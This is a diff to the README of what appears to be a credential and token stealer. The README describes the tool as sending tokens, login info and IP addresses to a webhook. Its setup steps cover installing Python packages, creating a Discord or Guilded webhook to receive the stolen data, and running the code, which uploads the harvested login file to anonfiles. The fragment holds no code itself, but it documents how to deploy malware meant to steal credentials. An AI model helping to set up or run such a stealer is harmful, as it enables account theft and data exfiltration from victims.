@@ -15,7 +15,7 @@ It will send a message in a webhook, with all the tokens, login info, ip and so 
    pip install pywin32
    pip install pycryptodome
    ```
-3. Make a webhook.
+3. Make a webhook in a discord server/guilded.gg server.
 4. Copy the webhook url into webhook.txt
 5. Run the code or something. (WARNING! This should be done in a vm(Virtual Machine) because the txt file with the login info will be uploaded to anonfiles, so anyone can access the file if they somehow get the url to the file).
 
